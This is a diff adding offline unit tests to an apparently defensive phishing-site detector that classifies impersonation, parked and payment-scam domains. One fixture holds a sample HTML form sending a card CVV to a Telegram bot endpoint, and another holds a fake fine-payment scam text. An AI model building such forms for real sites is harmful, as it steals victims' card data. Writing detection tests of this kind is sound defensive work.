@@ -67,3 +67,47 @@ def test_phone_normalisation():
 def test_score_official_is_zero():
     sc, sig = analyzer.score(25, "x", 1, None, official=True)
     assert sc == 0 and sig[0]["ok"]
+
+
+# ---------- site inspection & name-only gate (offline) ----------
+from rasid import verify  # noqa: E402
+
+W_FAKE = {"name": "ADCB", "official_domains": []}  # no official profile: UI check skipped, others still run
+
+
+def _page(html, **kw):
+    return {"reachable": True, "final_url": "https://adcb-verify.top/", "_html": html, "asks_for": [], "brands_mentioned": [], **kw}
+
+
+def test_name_alone_never_flags():
+    sc, sig = analyzer.score(25, "homoglyph", 2, {"reachable": True, "brands_mentioned": []})
+    assert sc <= analyzer.NAME_ONLY_CAP and any(s.get("kind") == "gate" for s in sig)
+
+
+def test_telegram_form_is_content_evidence():
+    html = '<html><body><form action="https://api.telegram.org/bot1:x/sendMessage"><input name="cvv"></form></body></html>'
+    r = verify.inspect("adcb-verify.top", _page(html, asks_for=["CVV"], brands_mentioned=["ADCB"]), W_FAKE)
+    assert r["links"] and r["verdict"] in ("malicious", "impersonation")
+    sc, _ = analyzer.score(18, "combosquat", 2, _page(html, asks_for=["CVV"]), extra=r["signals"])
+    assert sc >= 80
+
+
+def test_unrelated_business_scores_low():
+    text = " ".join(["We clean and repair pool tables across Salt Lake City with certified technicians."] * 20)
+    r = verify.inspect("adcbilliards.com", _page(f"<html><title>Pool tables</title><body><p>{text}</p></body></html>"), W_FAKE)
+    assert r["verdict"] == "unrelated business"
+    sc, _ = analyzer.score(18, "combosquat", 900, _page(""), extra=r["signals"])
+    assert sc < 20
+
+
+def test_parked_and_payment_detection():
+    assert verify.inspect("x.top", _page("<html><body>This domain is for sale! Buy this domain today.</body></html>"), W_FAKE)["verdict"] == "parked"
+    r = verify.inspect("x.top", _page("<html><body>Your fine is due. Pay AED 250 now via bank transfer to AE07 0331 2345 6789 0123 456</body></html>",
+                                     brands_mentioned=["ADCB"]), W_FAKE)
+    assert r["payment"] and r["verdict"] == "payment capture"
+
+
+def test_tracker_iframes_are_not_malicious():
+    html = ('<html><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-1" height="0" width="0" style="display:none"></iframe></noscript>'
+            '<iframe src="https://www.googletagmanager.com/x" width="0" height="0"></iframe></body></html>')
+    assert not verify.inspect("shop.com", _page(html), W_FAKE)["code"]
